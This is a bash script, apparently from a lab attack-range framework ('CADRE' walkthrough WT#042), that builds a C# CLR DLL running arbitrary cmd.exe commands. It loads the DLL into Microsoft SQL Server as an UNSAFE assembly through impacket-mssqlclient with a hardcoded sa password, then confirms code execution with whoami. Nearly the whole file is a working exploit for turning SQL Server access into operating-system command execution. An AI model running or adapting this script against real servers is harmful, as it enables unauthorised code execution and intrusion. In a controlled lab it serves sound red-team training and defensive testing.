#!/bin/bash
# CADRE — WT#042 MSSQL CLR Assembly (mbr02 / range.local SA)
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#042 — MSSQL CLR Assembly"
start_attack "042" "MSSQL CLR Assembly"

require_tool impacket-mssqlclient
require_env MBR02 "MBR02"
require_env DOMAIN_EXT "DOMAIN_EXT"

SA_PASS='s@_P@ssw0rd!L@b!'
WORKDIR="/tmp/cadre-wt042-$$"
mkdir -p "$WORKDIR"

step "Step 1: Build minimal CLR DLL (cmd exec)"
cat > "$WORKDIR/cmd.cs" <<'CS'
using System;
using System.Data.SqlTypes;
using System.Diagnostics;
public class Stub {
  public static SqlString Exec(SqlString command) {
    var p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + command.Value;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.CreateNoWindow = true;
    p.Start();
    string o = p.StandardOutput.ReadToEnd();
    p.WaitForExit();
    return new SqlString(o);
  }
}
CS

if command -v mcs &>/dev/null; then
  run_cmd "mcs /target:library /r:System.Data.dll /out:$WORKDIR/cmd.dll $WORKDIR/cmd.cs"
elif command -v csc &>/dev/null; then
  run_cmd "csc /target:library /out:$WORKDIR/cmd.dll $WORKDIR/cmd.cs"
else
  fail "mcs/csc not found — install mono-devel"
  exit 1
fi

DLL_HEX=$(xxd -p "$WORKDIR/cmd.dll" | tr -d '\n')

step "Step 2: SQL — CREATE ASSEMBLY + procedure + whoami"
SQLF="$WORKDIR/clr.sql"
cat > "$SQLF" <<SQL
IF OBJECT_ID('dbo.ExecCmd','P') IS NOT NULL DROP PROCEDURE dbo.ExecCmd;
IF EXISTS (SELECT 1 FROM sys.assemblies WHERE name = 'cmd_exec') DROP ASSEMBLY cmd_exec;
CREATE ASSEMBLY cmd_exec FROM 0x${DLL_HEX} WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE dbo.ExecCmd @cmd NVARCHAR(4000) AS EXTERNAL NAME cmd_exec.[Stub].Exec;
EXEC dbo.ExecCmd 'whoami';
SQL

run_cmd "timeout 90 impacket-mssqlclient \"${DOMAIN_EXT}/sa:${SA_PASS}@${MBR02}\" -windows-auth -file \"$SQLF\" 2>&1 | tee $WORKDIR/clr-output.txt"

if ! grep -qiE 'range\\\\|nt authority|mbr02' "$WORKDIR/clr-output.txt"; then
  fail "CLR whoami output not seen in SQL transcript"
  exit 1
fi

result 0 "MSSQL CLR Assembly executed"
